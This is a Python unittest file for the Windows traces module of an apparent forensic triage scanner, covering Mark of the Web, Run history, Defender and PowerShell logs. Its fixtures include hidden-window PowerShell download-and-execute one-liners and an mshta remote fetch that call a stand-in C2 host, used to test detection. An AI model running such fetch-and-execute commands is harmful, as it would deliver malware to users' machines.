"""The traces module (Mark of the Web, Win+R history, Defender, PowerShell log).

Hermetic: the OS readers are replaced (the same seams the release fixture uses),
except Mark of the Web, which writes real Zone.Identifier streams into a temp
folder on Windows.
"""

from __future__ import annotations

import hashlib
import os
import struct
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from zbtriage.context import ScanContext  # noqa: E402
from zbtriage.iocs import Indicator, IocSet  # noqa: E402
from zbtriage.modules import traces  # noqa: E402
from zbtriage.result import (CLEAN, EV_ATTEMPTED, EV_COMMAND, EV_CONTACTED, EV_ON_DISK,  # noqa: E402
                             HITS, ModuleResult)

BAD = "bad-c2.example"
# The run() helper pretends to be Windows by patching sys.platform, which the
# local-path rules read too; off Windows the download-origin walk would then
# refuse the temporary folder, so it is replaced there.
_REAL_WINDOWS = sys.platform == "win32"


SAMPLE = b"pretend spyware sample for the fingerprint test\n"
SAMPLE_SHA = hashlib.sha256(SAMPLE).hexdigest()


def ctx():
    s = IocSet([Indicator(BAD, "cc", "primary", "domain", "test"),
                Indicator(SAMPLE_SHA, "sample", "primary", "sha256", "test")], "t.txt", None)
    return ScanContext(iocs=s, emit=lambda _m: None)


# A real Windows always lists programs. An empty list is not a clean read (2.0.3), so the
# default is one listed program that no longer exists on disk.
_LISTED = ([("C:\\Fixture\\ordinary.exe", "", "shim cache")], {})


def run(motw_roots=None, runmru=({}, "", ""), events=None, programs=_LISTED):
    events = events or {}

    def fake_events(log, ids, max_events, fields):
        rows = events.get(log, [])
        if isinstance(rows, str):
            return [], rows
        return [e for e in rows if e["Id"] in ids], ""

    roots = list(motw_roots) if motw_roots else [tempfile.mkdtemp(prefix="empty_")]
    with patch.object(traces, "_tr_motw_roots", lambda: roots), \
            patch.object(traces, "_tr_read_runmru", lambda: runmru), \
            patch.object(traces, "_tr_ran_programs", lambda: programs), \
            patch.object(traces, "_tr_events", fake_events), \
            patch.object(traces, "_tr_antivirus_products", lambda: ([{"name": "Fixture antivirus", "state": 0, "signature_status": 1}], "")), \
            patch.object(traces, "_tr_extra_history", lambda *a: None), \
            patch.object(traces, "_tr_persistence", lambda *a: None), \
            patch.object(traces.sys, "platform", "win32"),             patch.object(traces, "_tr_check_motw",
                         traces._tr_check_motw if _REAL_WINDOWS else (lambda r, c: r.ran("mark-of-the-web"))), \
            patch.object(traces, "_tr_check_ran_programs",
                         traces._tr_check_ran_programs if _REAL_WINDOWS or programs is not _LISTED
                         else (lambda r, c: r.ran("ran-programs"))):
        return traces.run(ctx())


DEF = traces._TR_DEFENDER_LOG
PSL = traces._TR_PS_LOG


@unittest.skipUnless(sys.platform == "win32", "alternate data streams are NTFS-only")
class TestMarkOfTheWeb(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="motw_")

    def stamp(self, name, host_url, referrer=""):
        path = os.path.join(self.root, name)
        with open(path, "wb") as fh:
            fh.write(b"x")
        with open(path + ":Zone.Identifier", "w", encoding="utf-8") as fh:
            fh.write("[ZoneTransfer]\nZoneId=3\n")
            if referrer:
                fh.write("ReferrerUrl={}\n".format(referrer))
            fh.write("HostUrl={}\n".format(host_url))
        return path

    def test_download_from_an_indicator_host_is_contact(self):
        path = self.stamp("invoice.exe", "https://{}/payload.exe".format(BAD))
        self.stamp("ordinary.pdf", "https://example.org/doc.pdf")
        with open(os.path.join(self.root, "local.txt"), "wb") as fh:
            fh.write(b"no stream")
        r = run(motw_roots=[self.root])
        self.assertEqual(r.status, HITS)
        self.assertEqual([(h.indicator, h.evidence, h.location) for h in r.hits],
                         [(BAD, EV_CONTACTED, path)])
        self.assertTrue(r.hits[0].observed)
        self.assertEqual(r.submetrics["motw_files_examined"], 3)
        self.assertEqual(r.submetrics["motw_files_with_origin"], 2)

    def test_referrer_page_is_matched_too(self):
        self.stamp("doc.zip", "https://cdn.example.org/doc.zip",
                   referrer="https://{}/lure".format(BAD))
        r = run(motw_roots=[self.root])
        self.assertIn("while on the page", r.hits[0].detail)

    def test_lookalike_host_does_not_match(self):
        self.stamp("a.exe", "https://not{}/x".format(BAD))
        self.assertEqual(run(motw_roots=[self.root]).hits, [])

    def test_cap_reached_is_a_gap(self):
        for i in range(3):
            self.stamp("f{}.bin".format(i), "https://example.org/")
        with patch.object(traces, "_TR_MAX_FILES", 2):
            r = run(motw_roots=[self.root])
        self.assertIn("mark-of-the-web: remaining files",
                      [c.name for c in r.checks if not c.ran])


class TestRunHistory(unittest.TestCase):
    def test_indicator_in_a_win_r_command(self):
        values = {"a": "powershell -w h -c iwr https://{}/x | iex\\1".format(BAD),
                  "b": "notepad\\1", "MRUList": "ab"}
        r = run(runmru=(values, "2026-10-22 18:00:00", ""))
        hit = [h for h in r.hits if h.evidence == EV_COMMAND][0]
        self.assertEqual((hit.indicator, hit.observed), (BAD, "2026-10-22 18:00:00"))
        self.assertNotIn("\\1", hit.detail)
        self.assertEqual(len(r.leads), 1)
        self.assertIn("from the web", r.leads[0].what)

    def test_web_command_without_indicator_is_only_a_lead(self):
        values = {"a": "mshta https://unknown.example/v.hta\\1", "MRUList": "a"}
        r = run(runmru=(values, "", ""))
        self.assertEqual((r.hits, len(r.leads)), ([], 1))
        self.assertEqual(r.status, CLEAN)

    def test_plain_commands_are_not_leads(self):
        r = run(runmru=({"a": "cmd\\1", "b": "regedit\\1", "c": "https://news.example\\1",
                         "MRUList": "abc"}, "", ""))
        self.assertEqual(r.leads, [])

    def test_unreadable_history_is_a_gap(self):
        r = run(runmru=({}, "", "denied"))
        self.assertIn("run-history", [c.name for c in r.checks if not c.ran])


class TestDefender(unittest.TestCase):
    def test_detections_protection_off_and_exclusions_are_leads_only(self):
        rows = [
            {"Id": 1116, "Time": "2026-10-18T01:02:22",
             "Data": {"Threat Name": "Trojan:Win32/Pomal!rfn", "Path": "file:_D:\\x\\setup.exe",
                      "Action Name": "Quarantine"}},
            {"Id": 1116, "Time": "2026-10-18T01:00:00",
             "Data": {"Threat Name": "Trojan:Win32/Pomal!rfn", "Path": "file:_D:\\x\\setup.exe"}},
            {"Id": 5001, "Time": "2026-10-10T10:00:00", "Data": {}},
            # 5007 is read by property position: p2 old value, p3 new value.
            {"Id": 5007, "Time": "2026-10-09T10:00:00",
             "Data": {"p2": "", "p3":
                      "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Hide = 0x0"}},
            {"Id": 5007, "Time": "2026-10-08T10:00:00",
             "Data": {"p2": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions"
                            "\\Paths\\C:\\Old = 0x0", "p3": ""}},
            {"Id": 5007, "Time": "2026-10-07T10:00:00",   # housekeeping, not exclusions
             "Data": {"p2": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\X = 0x1",
                      "p3": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\X = 0x0"}},
        ]
        r = run(events={DEF: rows})
        self.assertEqual(r.status, CLEAN)
        whats = [l.what for l in r.leads]
        self.assertEqual(len(whats), 2, whats)
        # Active registered antivirus contextualizes the historical off event.
        self.assertIn("1 Defender exclusion(s) added", whats[0])
        self.assertIn("Paths\\C:\\Hide", whats[0])
        self.assertNotIn("C:\\Old", whats[0])            # a REMOVED exclusion is not listed
        self.assertTrue(any("Defender history records 1 protection-off" in note for note in r.notes))
        self.assertIn("'Trojan:Win32/Pomal!rfn' x2", whats[1])
        self.assertIn("Quarantine", whats[1])
        self.assertEqual(r.submetrics["defender_threats"], 1)
        self.assertEqual(r.submetrics["defender_exclusions_added"], 1)

    def test_indicator_inside_a_defender_record_is_a_finding(self):
        rows = [{"Id": 1116, "Time": "2026-10-18T01:00:00",
                 "Data": {"Threat Name": "Phish", "Path": "url:_https://{}/".format(BAD)}}]
        r = run(events={DEF: rows})
        self.assertEqual([(h.indicator, h.evidence) for h in r.hits], [(BAD, EV_ATTEMPTED)])

    def test_many_detections_are_one_readable_item(self):
        rows = [{"Id": 1116, "Time": "2026-10-18T01:00:00",
                 "Data": {"Threat Name": "T{}".format(i), "Path": "p{}".format(i)}}
                for i in range(30)]
        r = run(events={DEF: rows})
        self.assertEqual(len(r.leads), 1)
        self.assertIn("30 different threat(s)", r.leads[0].what)
        self.assertIn("and 18 more", r.leads[0].what)

    def test_unreadable_log_is_a_gap(self):
        r = run(events={DEF: "access denied"})
        self.assertIn("defender-history", [c.name for c in r.checks if not c.ran])


class TestPowerShellLog(unittest.TestCase):
    def test_multi_part_block_is_reassembled_and_matched(self):
        rows = [  # newest first, as the log returns them
            {"Id": 4104, "Time": "2026-10-22T18:00:01",
             "Data": {"p2": "Invoke-Expression $code", "p3": "blk-1", "p4": ""}},
            {"Id": 4104, "Time": "2026-10-22T18:00:00",
             "Data": {"p2": "$code = (New-Object Net.WebClient).DownloadString("
                            "'https://{}/a')".format(BAD), "p3": "blk-1", "p4": ""}},
        ]
        r = run(events={PSL: rows})
        self.assertEqual([(h.indicator, h.evidence) for h in r.hits], [(BAD, EV_COMMAND)])
        self.assertEqual(len(r.leads), 1)
        self.assertIn("downloaded and ran", r.leads[0].what)

    def test_empty_log_says_logging_is_off(self):
        r = run(events={PSL: []})
        self.assertIn("powershell-history", [c.name for c in r.checks if c.ran])
        self.assertTrue(any("script-block logging" in n for n in r.notes))


class TestPlatform(unittest.TestCase):
    def test_not_windows_reports_gaps_not_clean(self):
        with patch.object(traces.sys, "platform", "linux"):
            r = traces.run(ctx())
        self.assertFalse(any(c.ran for c in r.checks))
        self.assertEqual(len(r.checks), 12)


def shim_entry(path):
    """One Windows 10/11 shim cache entry in the published layout."""
    p = path.encode("utf-16-le")
    body = struct.pack("<H", len(p)) + p + struct.pack("<Q", 0) + struct.pack("<I", 0)
    return b"10ts" + b"\0\0\0\0" + struct.pack("<I", len(body)) + body


@unittest.skipUnless(sys.platform == "win32", "the program lists are Windows records")
class TestRanPrograms(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="ran_")
        self.sample = os.path.join(self.dir, "updater.exe")
        with open(self.sample, "wb") as fh:
            fh.write(SAMPLE)
        self.other = os.path.join(self.dir, "notepad.exe")
        with open(self.other, "wb") as fh:
            fh.write(b"ordinary program")

    def test_parsers(self):
        blob = b"\x34\0\0\0" + b"\0" * 48 + shim_entry(self.sample) + shim_entry("C:\\x.exe")
        self.assertEqual(traces._tr_parse_shimcache(blob), [self.sample, "C:\\x.exe"])
        self.assertEqual(traces._tr_parse_shimcache(b"10ts\xff\xff"), [])
        pca = "{}|2026-10-20 06:00:00.123\nbroken line\n".format(self.sample).encode("utf-16")
        rows = traces._tr_parse_pca(pca)
        self.assertEqual(rows[0][0], self.sample)
        self.assertTrue(rows[0][1].startswith("2026-10-2"))
        self.assertEqual(len(rows), 1)

    def test_a_sample_that_ran_anywhere_is_found_once(self):
        programs = [(self.sample, "", "shim cache"),
                    ("\\??\\" + self.sample, "2026-10-20 09:00:00", "launch list"),
                    (self.other, "", "shim cache"),
                    (os.path.join(self.dir, "deleted.exe"), "", "launch list"),
                    ("Microsoft.WindowsCalculator_8wekyb3d8bbwe", "", "shim cache")]
        r = run(programs=(programs, {}))
        self.assertEqual([(h.indicator, h.location, h.evidence, h.observed) for h in r.hits],
                         [(SAMPLE_SHA, self.sample, EV_ON_DISK, "2026-10-20 09:00:00")])
        self.assertIn("launch list and shim cache", r.hits[0].detail)
        m = r.submetrics
        self.assertEqual((m["ran_programs_listed"], m["ran_programs_fingerprinted"],
                          m["ran_programs_no_longer_on_disk"]), (3, 2, 1))

    def test_unreadable_source_is_a_gap_and_the_other_still_runs(self):
        r = run(programs=([(self.sample, "", "launch list")], {"shim cache": "denied"}))
        self.assertIn("ran-programs: shim cache", [c.name for c in r.checks if not c.ran])
        self.assertEqual(len(r.hits), 1)

    def test_quick_skips_as_a_gap(self):
        c = ctx()
        c.quick = True
        r = ModuleResult("traces")
        traces._tr_check_ran_programs(r, c)
        self.assertEqual([(x.name, x.ran) for x in r.checks], [("ran-programs", False)])


if __name__ == "__main__":
    unittest.main()


class TestHermeticTestsStubEveryModule(unittest.TestCase):
    """A new scan module that the hermetic end-to-end tests do not stub runs for
    real against the tester's own computer (it happened with this module: 230 s
    and a test that promised never to read the runner's files). Pin it."""

    def test_every_scanned_module_is_stubbed(self):
        import contextlib
        from reader_fixtures import stub_registered_readers
        from zbtriage.readers import READER_SPECS, reader_resolve
        with contextlib.ExitStack() as stack:
            patched = stub_registered_readers(stack)
            self.assertEqual(set(patched), {spec.name for spec in READER_SPECS})
            for spec in READER_SPECS:
                result = reader_resolve(spec)(ctx())
                self.assertEqual(result.name, spec.name)
                self.assertEqual([check.name for check in result.checks], ["fixture"])
        here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        for filename in ("test_pattern_integration.py", "test_bundle_release.py"):
            source = open(os.path.join(here, "tests", filename), encoding="utf-8").read()
            self.assertIn("stub_registered_readers(stack", source)


class OneCheckFailing(unittest.TestCase):
    """An unexpected error in one check is a gap for that check only."""

    def test_failing_check_is_a_gap_and_later_checks_still_run(self):
        def boom(*a):
            raise RuntimeError("unexpected layout")

        with patch.object(traces, "_tr_check_runbox", boom):
            r = run(events={PSL: [{"Id": 4104, "Message": "iwr https://" + BAD + "/x"}]})
        gaps = {c.name: c.reason for c in r.checks if not c.ran}
        self.assertIn("run-history", gaps)
        self.assertIn("RuntimeError", gaps["run-history"])
        self.assertTrue(any(c.name == "powershell-history" for c in r.checks))
        self.assertTrue(any(c.name == "ran-programs" for c in r.checks))


class PartlyDoneCheckFailing(unittest.TestCase):
    """A check that recorded success and then failed is incomplete, not clean."""

    def test_later_failure_marks_the_check_incomplete(self):
        def half(r, ctx, leads):
            r.ran("powershell-history")
            raise ValueError("second source broke")

        with patch.object(traces, "_tr_check_powershell", half):
            r = run()
        self.assertTrue(any(c.name == "powershell-history" and not c.ran for c in r.checks))
        self.assertNotEqual(r.status, CLEAN)
